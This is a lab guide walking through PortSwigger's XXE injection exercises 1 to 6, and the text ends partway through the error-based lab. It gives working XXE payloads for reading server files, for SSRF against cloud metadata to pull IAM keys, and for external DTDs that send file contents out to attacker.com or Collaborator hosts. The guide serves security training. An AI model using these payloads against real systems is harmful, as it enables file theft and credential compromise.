# XML External Entity (XXE) Injection - Complete PortSwigger Labs Guide

## Table of Contents
- [Overview](#overview)
- [Lab Summary Table](#lab-summary-table)
- [XXE Fundamentals](#xxe-fundamentals)
- [Lab Walkthroughs](#lab-walkthroughs)
  - [Lab 1: Basic File Retrieval](#lab-1-exploiting-xxe-using-external-entities-to-retrieve-files)
  - [Lab 2: SSRF via XXE](#lab-2-exploiting-xxe-to-perform-ssrf-attacks)
  - [Lab 3: Blind XXE with Out-of-Band](#lab-3-blind-xxe-with-out-of-band-interaction)
  - [Lab 4: Blind XXE with Parameter Entities](#lab-4-blind-xxe-with-out-of-band-interaction-using-parameter-entities)
  - [Lab 5: Blind XXE Data Exfiltration](#lab-5-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
  - [Lab 6: Error-Based XXE](#lab-6-exploiting-blind-xxe-to-retrieve-data-via-error-messages)
  - [Lab 7: XInclude Attack](#lab-7-exploiting-xinclude-to-retrieve-files)
  - [Lab 8: XXE via File Upload](#lab-8-exploiting-xxe-via-image-file-upload)
  - [Lab 9: Local DTD Repurposing](#lab-9-exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd)
- [Attack Techniques](#attack-techniques)
- [Burp Suite Workflows](#burp-suite-workflows)
- [Common Mistakes & Troubleshooting](#common-mistakes--troubleshooting)
- [Prevention & Defense](#prevention--defense)
- [References & Resources](#references--resources)

---

## Overview

XML External Entity (XXE) injection is a web security vulnerability that allows attackers to interfere with an application's processing of XML data. XXE attacks can be used to:

- **Retrieve files** from the server filesystem
- **Perform SSRF attacks** to interact with internal systems
- **Exfiltrate sensitive data** via out-of-band channels
- **Cause denial of service** through resource exhaustion
- **Execute remote code** in severe misconfigurations

This guide covers all 9 PortSwigger Web Security Academy XXE labs with complete exploitation walkthroughs, payloads, and techniques.

---

## Lab Summary Table

| # | Lab Name | Difficulty | Attack Type | Time | Key Technique |
|---|----------|-----------|-------------|------|---------------|
| 1 | Exploiting XXE using external entities to retrieve files | Apprentice | File Retrieval | 5 min | Basic external entity |
| 2 | Exploiting XXE to perform SSRF attacks | Apprentice | SSRF | 10 min | Cloud metadata access |
| 3 | Blind XXE with out-of-band interaction | Practitioner | Detection | 5 min | Burp Collaborator |
| 4 | Blind XXE with out-of-band interaction via XML parameter entities | Practitioner | Detection | 5 min | Parameter entities |
| 5 | Exploiting blind XXE to exfiltrate data using a malicious external DTD | Practitioner | Data Exfiltration | 10 min | External DTD hosting |
| 6 | Exploiting blind XXE to retrieve data via error messages | Practitioner | Error-Based | 8 min | Invalid file path |
| 7 | Exploiting XInclude to retrieve files | Practitioner | XInclude | 5 min | Partial XML control |
| 8 | Exploiting XXE via image file upload | Practitioner | File Upload | 8 min | SVG exploitation |
| 9 | Exploiting XXE to retrieve data by repurposing a local DTD | Expert | Local DTD | 15 min | Entity redefinition |

---

## XXE Fundamentals

### What is XXE?

XXE vulnerabilities arise when an application parses XML input and allows external entities to be defined and processed. The XML specification includes features like:

- **External Entities**: References to external resources (files, URLs)
- **Parameter Entities**: Entities used within DTD definitions
- **XInclude**: Mechanism to include external XML documents
- **Document Type Definitions (DTDs)**: Schema definitions that can reference external resources

### Basic XXE Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <element>&xxe;</element>
</root>
```

**Components:**
1. **XML Declaration**: `<?xml version="1.0" encoding="UTF-8"?>`
2. **DOCTYPE**: Defines the document type and entities
3. **ENTITY Declaration**: Defines an external entity named "xxe"
4. **SYSTEM Keyword**: References an external resource
5. **Entity Reference**: `&xxe;` - where the entity value is inserted

### Entity Types

**General Entities** (used in XML content):
```xml
<!ENTITY entityName "value">
<!ENTITY entityName SYSTEM "file:///path/to/file">
```

**Parameter Entities** (used in DTD definitions):
```xml
<!ENTITY % entityName "value">
<!ENTITY % entityName SYSTEM "http://attacker.com/evil.dtd">
```

### Common Target Files

**Linux/Unix:**
- `/etc/passwd` - User account information
- `/etc/hostname` - System hostname
- `/etc/hosts` - Host file mappings
- `/etc/group` - Group information
- `/proc/self/environ` - Environment variables
- `/proc/self/cmdline` - Process command line
- `/var/log/apache2/access.log` - Web server logs
- `/home/user/.ssh/id_rsa` - SSH private keys

**Windows:**
- `C:\Windows\System32\drivers\etc\hosts` - Host file
- `C:\Windows\win.ini` - Windows configuration
- `C:\boot.ini` - Boot configuration
- `C:\Windows\System32\config\SAM` - User credentials (usually protected)

**Cloud Metadata Endpoints:**
- AWS: `http://169.254.169.254/latest/meta-data/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`

---

## Lab Walkthroughs

### Lab 1: Exploiting XXE using external entities to retrieve files

**Difficulty:** Apprentice
**Objective:** Retrieve the contents of `/etc/passwd` file
**URL:** https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

#### Description

This lab has a "Check stock" feature that parses XML input and returns values in the response. This is a classic XXE vulnerability where the application displays the parsed XML content, making it a non-blind attack.

#### Solution Steps

**Step 1: Identify the XML Input**

1. Browse to any product page
2. Click "Check stock" button
3. Intercept the request in Burp Suite Proxy

**Original Request:**
```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Step 2: Inject the XXE Payload**

Insert a DOCTYPE declaration with an external entity definition:

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/xml
Content-Length: 200

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Step 3: Analyze the Response**

The server will attempt to display the product ID, which now contains the file contents:

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
..."
```

#### Payload Breakdown

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

- `DOCTYPE foo` - Declares document type (name "foo" is arbitrary)
- `<!ENTITY xxe` - Defines a general entity named "xxe"
- `SYSTEM "file:///etc/passwd"` - External resource using file:// protocol
- `&xxe;` - Reference that gets replaced with file contents

#### Alternative Payloads

**Read different files:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
```

**Windows targets:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]>
```

#### Common Mistakes

1. **Wrong entity syntax** - Using `%xxe;` instead of `&xxe;` (parameter vs general entity)
2. **Missing DOCTYPE** - Forgetting to define the entity before using it
3. **Wrong file path** - Using backslashes on Linux or forward slashes on Windows
4. **Encoding issues** - Not properly handling special characters in file paths

#### Lab Completion

✅ The lab is solved when you successfully retrieve and display `/etc/passwd` contents

---

### Lab 2: Exploiting XXE to perform SSRF attacks

**Difficulty:** Apprentice
**Objective:** Use XXE to access EC2 metadata and retrieve IAM secret access key
**URL:** https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

#### Description

This lab demonstrates how XXE can be used to perform Server-Side Request Forgery (SSRF) attacks. A simulated EC2 metadata endpoint at `http://169.254.169.254/` contains IAM credentials that can be accessed via XXE.

#### Background: AWS EC2 Metadata Service

AWS EC2 instances have access to a metadata service at `http://169.254.169.254/` that provides:
- Instance information
- IAM role credentials
- User data
- Network configuration

**Metadata API Structure:**
```
http://169.254.169.254/
├── latest/
│   ├── meta-data/
│   │   ├── iam/
│   │   │   └── security-credentials/
│   │   │       └── [role-name]/  ← Contains AWS credentials
│   │   ├── hostname
│   │   ├── public-ipv4
│   │   └── ...
│   └── user-data
```

#### Solution Steps

**Step 1: Initial Probe**

Test connectivity to the metadata service:

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Response:**
```
Invalid product ID: latest
```

**Step 2: Enumerate Metadata Paths**

Navigate through the API structure:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/"> ]>
```

**Response:**
```
Invalid product ID: meta-data
user-data
```

**Step 3: Access IAM Credentials Path**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```

**Response:**
```
Invalid product ID: ami-id
hostname
iam/
...
```

**Step 4: Enumerate IAM Path**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/"> ]>
```

**Response:**
```
Invalid product ID: security-credentials/
```

**Step 5: Get Role Name**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
```

**Response:**
```
Invalid product ID: admin
```

**Step 6: Retrieve IAM Credentials**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

**Response:**
```json
Invalid product ID: {
  "Code": "Success",
  "LastUpdated": "2024-01-09T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "token",
  "Expiration": "2024-01-09T18:00:00Z"
}
```

**Step 7: Submit the Secret Access Key**

Copy the `SecretAccessKey` value and submit it using the lab's solution button.

#### Full Payload

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/xml
Content-Length: 250

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

#### Attack Flow Diagram

```
[Attacker] → [Vulnerable App] → [EC2 Metadata Service]
           ① XXE Payload     ② HTTP Request to 169.254.169.254
                             ③ Returns IAM Credentials
           ④ Credentials in Response
```

#### Real-World SSRF Targets

**Internal Services:**
```xml
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
<!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
<!ENTITY xxe SYSTEM "http://internal-api.local/users">
```

**Cloud Metadata Services:**
```xml
<!-- AWS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- Azure -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">

<!-- GCP -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
```

**Port Scanning:**
```xml
<!ENTITY xxe SYSTEM "http://internal-host:22">
<!ENTITY xxe SYSTEM "http://internal-host:3306">
<!ENTITY xxe SYSTEM "http://internal-host:6379">
```

#### Common Mistakes

1. **Wrong metadata version** - Using outdated API paths
2. **Missing role enumeration** - Not checking for the role name before accessing credentials
3. **Forgetting URL encoding** - When special characters are in paths
4. **Network restrictions** - Firewall rules may block certain internal ranges

#### Lab Completion

✅ The lab is solved when you submit the correct IAM secret access key

---

### Lab 3: Blind XXE with out-of-band interaction

**Difficulty:** Practitioner
**Objective:** Trigger DNS/HTTP interactions with Burp Collaborator
**URL:** https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

#### Description

This lab introduces **blind XXE** vulnerabilities where the application processes XML but doesn't return the parsed content in responses. Detection requires out-of-band (OOB) techniques using external DNS/HTTP callbacks.

#### What is Blind XXE?

In blind XXE attacks:
- The application parses XML and processes entities
- **No direct output** is returned to the attacker
- Detection requires **side-channel techniques**:
  - DNS lookups to attacker-controlled domain
  - HTTP requests to attacker's server
  - Time delays (less reliable)

#### Burp Collaborator Overview

Burp Collaborator is a service that:
- Provides unique subdomains (e.g., `abc123.burpcollaborator.net`)
- Monitors DNS queries and HTTP requests to these domains
- Records all interactions for detection and data exfiltration

**Access Collaborator:**
1. Burp Suite → Burp menu → Burp Collaborator client
2. Click "Copy to clipboard" to get a unique payload domain

#### Solution Steps

**Step 1: Generate Collaborator Payload**

In Burp Suite Professional:
1. Go to Burp → Burp Collaborator client
2. Click "Copy to clipboard"
3. You'll get a domain like: `abc123xyz.burpcollaborator.net`

**Step 2: Inject XXE with External Entity**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Replace** `YOUR-COLLABORATOR-SUBDOMAIN` with your actual Collaborator domain.

**Example:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://abc123xyz.burpcollaborator.net"> ]>
```

**Step 3: Monitor Collaborator**

1. Return to Burp Collaborator client
2. Click "Poll now"
3. Observe DNS and HTTP interactions

**Expected Interactions:**
```
DNS Query:
abc123xyz.burpcollaborator.net

HTTP Request:
GET / HTTP/1.1
Host: abc123xyz.burpcollaborator.net
Connection: close
```

#### Payload Variations

**DNS-only (more reliable):**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://abc123.burpcollaborator.net"> ]>
```

**HTTPS (if supported):**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://abc123.burpcollaborator.net"> ]>
```

**FTP (alternative protocol):**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "ftp://abc123.burpcollaborator.net"> ]>
```

#### Why Out-of-Band Detection Works

```
[Vulnerable Server] receives XXE payload
         ↓
[XML Parser] processes entity definition
         ↓
[Server makes DNS query] to resolve burpcollaborator.net
         ↓
[Server makes HTTP request] to http://abc123.burpcollaborator.net
         ↓
[Burp Collaborator] records interaction
         ↓
[Attacker polls] Collaborator and sees the interaction
```

#### Alternative OOB Techniques (Without Burp Pro)

**1. Using Your Own Server:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://your-server.com/xxe"> ]>
```

Monitor with:
```bash
# Simple Python HTTP server
python3 -m http.server 80

# Or netcat
nc -lvnp 80
```

**2. Using DNS Callback Services:**
- Burp Collaborator (requires Burp Pro)
- Interactsh: https://app.interactsh.com/
- RequestBin (HTTP only)
- Webhook.site

**3. DNS Exfiltration with dig:**
```bash
# On your server with a domain you control
# Watch DNS queries
tcpdump -i any -n port 53
```

#### Common Mistakes

1. **Using localhost** - Won't trigger external interactions
2. **Firewall blocks** - Outbound connections may be filtered
3. **Not polling Collaborator** - Forgetting to check for interactions
4. **Wrong protocol** - Some servers only support certain protocols
5. **HTTPS requirements** - Some environments block HTTP

#### Troubleshooting

**No interactions received:**
- Check firewall rules (outbound HTTP/DNS)
- Try different protocols (http, https, ftp)
- Verify Collaborator domain is correct
- Wait a few seconds before polling
- Try parameter entities (next lab)

**DNS works but HTTP doesn't:**
- Normal! DNS is often less restricted
- Lab may only require DNS interaction

#### Lab Completion

✅ The lab is solved when Burp Collaborator receives DNS/HTTP interactions from the vulnerable application

---

### Lab 4: Blind XXE with out-of-band interaction using parameter entities

**Difficulty:** Practitioner
**Objective:** Use parameter entities to bypass entity restrictions
**URL:** https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

#### Description

This lab blocks regular external entities but allows **parameter entities**. Parameter entities are processed differently and can bypass some protections.

#### General vs Parameter Entities

**General Entities** (used in XML content):
```xml
<!ENTITY name "value">
&name;  <!-- Reference with & and ; -->
```

**Parameter Entities** (used in DTD):
```xml
<!ENTITY % name "value">
%name;  <!-- Reference with % and ; -->
```

**Key Difference:**
- General entities: `&xxe;` - Used in XML element content
- Parameter entities: `%xxe;` - Used within DTD definitions
- Parameter entities can reference external DTDs

#### Solution Steps

**Step 1: Generate Collaborator Payload**

Get your unique Burp Collaborator domain (same as Lab 3).

**Step 2: Inject Parameter Entity Payload**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Important differences from Lab 3:**
1. `<!ENTITY % xxe` - Defines a **parameter entity** (note the `%`)
2. `%xxe;` - References the parameter entity **within the DTD**
3. No `&xxe;` in the XML content

**Step 3: Verify Interaction**

Poll Burp Collaborator for DNS/HTTP requests.

#### Payload Breakdown

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://abc123.burpcollaborator.net">
  %xxe;
]>
```

**Execution flow:**
1. `<!ENTITY % xxe SYSTEM "...">` - Defines parameter entity
2. `%xxe;` - **Immediately invokes** the entity within DTD
3. XML parser makes HTTP request to Collaborator domain
4. No need to reference entity in XML content

#### Why This Works When General Entities Don't

Some XML parsers implement restrictions:
- Block external **general entities** (`&entity;`)
- Allow external **parameter entities** (`%entity;`)

This is often due to:
- Misconfigured parser settings
- Incomplete security controls
- Framework-specific behaviors

#### Parameter Entity with External DTD

**More advanced technique (preview of next labs):**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

**evil.dtd contents:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

This technique is used for data exfiltration in blind XXE scenarios.

#### Alternative Payloads

**FTP protocol:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "ftp://YOUR-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

**Multiple parameter entities:**
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe1 SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN/first">
  <!ENTITY % xxe2 SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN/second">
  %xxe1;
  %xxe2;
]>
```

#### Common Mistakes

1. **Using general entity syntax** - `&xxe;` instead of `%xxe;`
2. **Wrong placement** - Referencing in XML content instead of DTD
3. **Missing invocation** - Defining entity but not invoking with `%xxe;`
4. **Encoding issues** - Special characters in URLs

#### Detection Logic

```python
# Pseudo-code for detection
if DNS_query_to_collaborator or HTTP_request_to_collaborator:
    print("XXE vulnerability confirmed!")
    print("Parameter entities are allowed")
```

#### Lab Completion

✅ The lab is solved when Burp Collaborator receives interactions from the parameter entity invocation

---

### Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD

**Difficulty:** Practitioner
**Objective:** Exfiltrate `/etc/hostname` contents via out-of-band channel
**URL:** https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

#### Description

This lab demonstrates **blind XXE data exfiltration** by hosting a malicious DTD file that reads server files and sends their contents to an attacker-controlled server.

#### Attack Architecture

```
[Attacker's Exploit Server] hosts evil.dtd
           ↓
[Vulnerable App] receives XXE payload
           ↓
[Vulnerable App] fetches evil.dtd from exploit server
           ↓
[evil.dtd] instructs app to read /etc/hostname
           ↓
[Vulnerable App] sends file contents to Collaborator
           ↓
[Attacker] retrieves data from Collaborator
```

#### Solution Steps

**Step 1: Generate Burp Collaborator Payload**

Get your unique subdomain from Burp Collaborator client.

**Step 2: Create Malicious DTD**

Go to the exploit server provided by the lab and create this DTD file:

**Body section of exploit server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

**Important:**
- Replace `YOUR-COLLABORATOR-SUBDOMAIN` with your actual Collaborator domain
- Click "Store" to save the malicious DTD

**Step 3: Note the Exploit Server URL**

The exploit server URL will look like:
```
https://exploit-abc123.exploit-server.net/exploit
```

**Step 4: Inject XXE Payload**

Intercept the stock check request and modify it:

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-abc123.exploit-server.net/exploit"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Step 5: Monitor Collaborator**

1. Go to Burp Collaborator client
2. Click "Poll now"
3. Look for HTTP request containing the file data

**Expected Interaction:**
```http
GET /?x=hostname-value-here HTTP/1.1
Host: abc123.burpcollaborator.net
```

**Step 6: Extract and Submit Hostname**

Copy the value from the `x` parameter and submit it using the lab's solution button.

#### Detailed Payload Analysis

**External DTD (evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">
%eval;
%exfil;
```

**Line-by-line breakdown:**

1. `<!ENTITY % file SYSTEM "file:///etc/hostname">`
   - Defines parameter entity `%file;`
   - Reads contents of `/etc/hostname`
   - Value stored in `%file;` entity

2. `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">`
   - Defines parameter entity `%eval;`
   - Contains **nested entity definition**
   - `&#x25;` is XML entity for `%` character (to avoid syntax issues)
   - Creates entity `%exfil;` that makes HTTP request
   - URL includes `%file;` to exfiltrate file contents

3. `%eval;`
   - Invokes the `%eval;` entity
   - This **defines** the `%exfil;` entity with file contents embedded

4. `%exfil;`
   - Invokes the `%exfil;` entity
   - Makes HTTP request: `http://COLLAB/?x=[file-contents]`
   - Sends file data to attacker's Collaborator

#### Why This Complex Structure?

**Problem:** XML parsers don't allow parameter entity references inside entity declarations in internal DTD:
```xml
<!-- This DOESN'T WORK in internal DTD: -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % exfil SYSTEM "http://collab/?x=%file;">
  %exfil;
]>
```

**Solution:** Use external DTD that defines nested entities:
- External DTDs have fewer restrictions
- Multi-level entity definitions work in external DTDs
- First entity reads file, second entity exfiltrates it

#### Attack Flow Visualization

```
1. App receives XXE payload
   ↓
2. App fetches external DTD from exploit server
   ↓
3. DTD defines %file entity → reads /etc/hostname
   ↓
4. DTD defines %eval entity → creates %exfil entity definition
   ↓
5. %eval is invoked → %exfil entity now defined with file contents
   ↓
6. %exfil is invoked → HTTP request to Collaborator
   ↓
7. Collaborator receives: GET /?x=vulnerable-host-123
```

#### Alternative Target Files

**Read different files:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % file SYSTEM "file:///proc/self/environ">
<!ENTITY % file SYSTEM "file:///var/www/html/config.php">
```

**Windows targets:**
```xml
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % file SYSTEM "file:///c:/boot.ini">
```

#### URL Encoding Issues

If file contents have special characters, they may break the URL. Solutions:

**1. Base64 encoding (if supported by target app):**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

**2. Use POST instead of GET (less common):**
Some implementations allow POST requests for larger data.

**3. Multiple requests (chunking):**
Exfiltrate file line by line if needed.

#### Common Mistakes

1. **Wrong exploit server URL** - Using HTTP instead of HTTPS or vice versa
2. **Forgetting to invoke entities** - Missing `%eval;` or `%exfil;`
3. **Entity encoding** - Using `%` instead of `&#x25;` in nested definitions
4. **Collaborator polling** - Not clicking "Poll now" to retrieve interactions
5. **Special characters** - File contents with `&`, `<`, `>` breaking XML

#### Troubleshooting

**No Collaborator interaction:**
- Verify exploit server URL is correct and accessible
- Check external DTD syntax (XML validation)
- Try accessing exploit server URL directly in browser
- Ensure firewall allows outbound HTTP

**Interaction but no data:**
- File may not exist on target system
- Try different file paths
- Check for URL encoding issues
- Verify `%file;` is correctly referenced in URL

**Invalid XML errors:**
- Special characters in file need escaping
- Try PHP filter with base64 encoding
- Use shorter files without special chars

#### Lab Completion

✅ The lab is solved when you successfully exfiltrate and submit the `/etc/hostname` contents

---

### Lab 6: Exploiting blind XXE to retrieve data via error messages

**Difficulty:** Practitioner
**Objective:** Use error messages to exfiltrate `/etc/passwd`
**URL:** https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages

#### Description

This lab demonstrates **error-based XXE data exfiltration**. When out-of-band interactions are blocked, attackers can trigger XML parsing errors that include file contents in error messages returned to the user.

#### When to Use Error-Based XXE

Use this technique when:
- Out-of-band (OOB) connections are blocked by firewall
- DNS/HTTP requests to external servers fail
- Application returns error messages in responses
- You need immediate feedback without external server

#### Solution Steps

**Step 1: Create Malicious DTD**

On the exploit server provided, create this DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

**How it works:**
- `%file;` reads `/etc/passwd`
- `%exfil;` tries to access non-existent file: `/invalid/[passwd-contents]`
- Invalid file path causes **error**
- Error message includes the attempted file path (with passwd contents)

**Step 2: Get Exploit Server URL**

Note your exploit server URL:
```
https://exploit-abc123.exploit-server.net/exploit
```

**Step 3: Inject XXE Payload**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-abc123.exploit-server.net/exploit"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Step 4: Observe Error Response**

The server returns an error message containing `/etc/passwd`:

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{
  "error": "XML parsing error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
..."
}
```

#### Payload Analysis

**External DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

**Execution flow:**

1. **Read target file:**
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   ```
   - Reads `/etc/passwd` into `%file;` entity

2. **Create error-triggering entity:**
   ```xml
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
   ```
   - Defines `%eval;` which contains another entity definition
   - `&#x25;` encodes `%` character
   - Creates `%exfil;` that references invalid path with file contents

3. **Invoke evaluation:**
   ```xml
   %eval;
   ```
   - Defines the `%exfil;` entity with file contents embedded

4. **Trigger error:**
   ```xml
   %exfil;
   ```
   - Attempts to access `file:///invalid/[passwd-contents]`
   - File doesn't exist → throws error
   - Error message includes attempted file path
   - File contents leaked in error message!

#### Why This Works

**XML Parser Error Handling:**

When XML parser encounters:
```
file:///invalid/root:x:0:0:root:/root:/bin/bash...
```

It throws an error like:
```
FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash...
```

The error message **includes the invalid path**, which contains the file contents we read with `%file;`.

#### Attack Visualization

```
┌─────────────────────────────────────────────┐
│ 1. %file reads /etc/passwd                  │
│    Content: "root:x:0:0:root:/root:..."     │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│ 2. %eval defines %exfil entity              │
│    Path: file:///invalid/%file;             │
│    Expands to: file:///invalid/root:x:...   │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│ 3. %exfil invoked - tries to access:        │
│    file:///invalid/root:x:0:0:root:...      │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│ 4. File doesn't exist - ERROR thrown        │
│    Error msg includes path with file data!  │
└─────────────────────────────────────────────┘
```

#### Alternative Approaches

**Different invalid paths:**
```xml
<!ENTITY % exfil SYSTEM 'file:///nonexistent/%file;'>
<!ENTITY % exfil SYSTEM 'file:///dev/null/%file;'>
<!ENTITY % exfil SYSTEM 'file:///tmp/fakedir/%file;'>
```

**Protocol errors:**
```xml
<!ENTITY % exfil SYSTEM 'invalid-protocol://error/%file;'>
```

**HTTP errors (if external requests allowed but OOB blocked):**
```xml
<!ENTITY % exfil SYSTEM 'http://localhost:99999/%file;'>  <!-- Invalid port -->
```

#### Different Target Files

```xml
<!-- Read hostname -->
<!ENTITY % file SYSTEM "file:///etc/hostname">

<!-- Read environment -->
<!ENTITY % file SYSTEM "file:///proc/self/environ">

<!-- Read web config -->
<!ENTITY % file SYSTEM "file:///var/www/html/config.php">

<!-- Windows files -->
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
```

#### Handling Special Characters

**Problem:** File contents with XML special characters may break parsing.

**Solutions:**

